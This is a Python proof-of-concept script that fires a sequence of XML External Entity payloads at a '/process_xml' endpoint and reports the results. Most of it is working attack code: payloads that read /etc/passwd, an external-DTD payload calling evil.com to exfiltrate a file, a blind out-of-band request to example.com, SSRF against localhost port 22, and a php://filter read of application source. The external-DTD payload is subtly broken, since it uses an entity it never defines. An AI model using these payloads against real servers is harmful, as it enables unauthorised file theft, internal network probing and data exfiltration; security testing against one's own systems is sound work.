#!/usr/bin/env python3

import requests
import sys
import json

def xxe_poc(base_url):
    print("\n[*] XML External Entity (XXE) Proof of Concept")
    print("[*] This PoC demonstrates XXE injection to read local files")
    
    # The vulnerable endpoint
    xxe_url = f"{base_url}/process_xml"
    
    # First, try with a normal XML payload
    print("\n[+] Testing with a normal XML payload...")
    normal_xml = """<?xml version="1.0" encoding="UTF-8"?>
<root>
  <element>Normal XML content</element>
</root>"""
    
    headers = {"Content-Type": "application/xml"}
    response = requests.post(xxe_url, data=normal_xml, headers=headers)
    
    if response.status_code == 200 and "XML processed successfully" in response.text:
        print("[+] Normal XML processing works as expected")
        print(f"[+] Response: {response.text}")
    else:
        print("[-] Normal XML processing failed")
        print(f"[-] Status code: {response.status_code}")
        print(f"[-] Response: {response.text}")
        print("[-] Endpoint might not be vulnerable or might not be accessible")
        return
    
    # Now try XXE to read /etc/passwd
    print("\n[+] Attempting XXE to read /etc/passwd...")
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <element>&xxe;</element>
</root>"""
    
    print("[+] Sending payload:", xxe_payload)
    response = requests.post(xxe_url, data=xxe_payload, headers=headers)
    
    # If we get the undefined entity error, try an alternative approach
    if response.status_code == 200 and "undefined entity &xxe;" in response.text:
        print("[!] Detected 'undefined entity' error - this indicates ElementTree parser is being used")
        print("[+] This is good! The server is attempting to process our XML with entities")
        print("[+] Trying alternative XXE approaches...")
        
        # Try a different XXE payload that might work with ElementTree
        alt_xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT data ANY>
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>"""
        
        print("\n[+] Sending alternative payload that uses external DTD:")
        print(alt_xxe_payload)
        response = requests.post(xxe_url, data=alt_xxe_payload, headers=headers)
    
    # Check if the XXE attack was successful or if we got useful error information
    print(f"\n[+] Response status code: {response.status_code}")
    print(f"[+] Response: {response.text}")
    
    # Parse the response
    try:
        result = response.json()
        
        # Check for error messages that indicate XXE processing
        if "error" in result:
            error_msg = result["error"]
            print(f"[+] Error message: {error_msg}")
            
            if "undefined entity" in error_msg:
                print("[!] XXE VULNERABILITY LIKELY CONFIRMED!")
                print("[+] The server attempted to process the external entity but couldn't resolve it")
                print("[+] This indicates the XML parser is trying to process entities, which is the first step in XXE")
                
                # Try a blind XXE payload that doesn't rely on output
                print("\n[+] Attempting blind XXE to make an outbound connection...")
                blind_xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://example.com/collect?data=test"> %xxe; ]>
<root>Blind XXE Test</root>"""
                
                print("[+] Sending blind XXE payload:")
                print(blind_xxe_payload)
                response = requests.post(xxe_url, data=blind_xxe_payload, headers=headers)
                print(f"[+] Response: {response.text}")
                
                # Try another XXE payload for SSRF
                print("\n[+] Attempting XXE for Server-Side Request Forgery (SSRF)...")
                ssrf_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:22"> ]>
<root>
  <element>&xxe;</element>
</root>"""
                
                print("[+] Sending SSRF payload:")
                print(ssrf_payload)
                response = requests.post(xxe_url, data=ssrf_payload, headers=headers)
                print(f"[+] SSRF attempt response: {response.text}")
                
                # If we get the undefined entity error again, that's a good sign
                if "undefined entity &xxe;" in response.text:
                    print("[!] Detected 'undefined entity' error again - this confirms the parser is attempting to process entities")
                    print("[+] This is a strong indicator of XXE vulnerability")
                
                print("\n[+] This vulnerability could be used to:")
                print("    1. Read sensitive files on the server (with a more sophisticated attack)")
                print("    2. Perform server-side request forgery (SSRF)")
                print("    3. Conduct denial of service attacks")
                print("    4. Exfiltrate data through out-of-band channels")
            
            # Check for other error messages that might indicate XXE
            elif "SYSTEM" in error_msg or "DOCTYPE" in error_msg:
                print("[!] XXE VULNERABILITY POSSIBLE!")
                print("[+] The error message contains XML-specific keywords")
            else:
                print("[-] The application returned an error, but it's not clear if XXE is possible")
        
        # Look for signs of successful XXE in the response
        elif "root:" in response.text or "nobody:" in response.text:
            print("[!] XXE VULNERABILITY CONFIRMED!")
            print("[+] Successfully read /etc/passwd via XXE")
            
            # Try to extract the file content from the response
            if "element" in response.text:
                import re
                passwd_content = re.search(r'<element>(.+?)</element>', response.text)
                if passwd_content:
                    print("\n[+] File content:")
                    print(passwd_content.group(1))
            
            print("\n[+] This vulnerability could be used to:")
            print("    1. Read sensitive files on the server")
            print("    2. Perform server-side request forgery (SSRF)")
            print("    3. Conduct denial of service attacks")
            print("    4. In some cases, achieve remote code execution")
        else:
            print("[-] XXE attack response doesn't contain expected file content")
            print("[-] The application might be vulnerable but the output is not visible in the response")
    except json.JSONDecodeError:
        print("[-] Failed to parse JSON response")
        print(f"[-] Raw response: {response.text}")
    
    # Try a more advanced XXE payload using PHP filter to read source code
    print("\n[+] Attempting XXE with PHP filter to read application source code...")
    php_filter_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=vulnerable_app.py"> ]>
<root>
  <element>&xxe;</element>
</root>"""
    
    print("[+] Sending PHP filter payload:")
    print(php_filter_payload)
    response = requests.post(xxe_url, data=php_filter_payload, headers=headers)
    print(f"[+] Response: {response.text}")
    
    # If we get the undefined entity error again, that's a good sign
    if "undefined entity &xxe;" in response.text:
        print("[!] Detected 'undefined entity' error again with PHP filter - vulnerability confirmed")
    
    # Create a summary of findings
    print("\n[*] XXE Vulnerability Assessment Summary:")
    print("[*] Based on the error messages received, this application appears to be vulnerable to XXE attacks")
    print("[*] The XML parser is attempting to process external entities but failing to resolve them")
    print("[*] This is a positive indicator of XXE vulnerability")
    print("[*] In a real-world scenario, more sophisticated XXE techniques could be used to exploit this vulnerability")
    print("[*] Recommendation: Disable external entity processing in the XML parser")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
        
    base_url = sys.argv[1].rstrip('/')
    xxe_poc(base_url)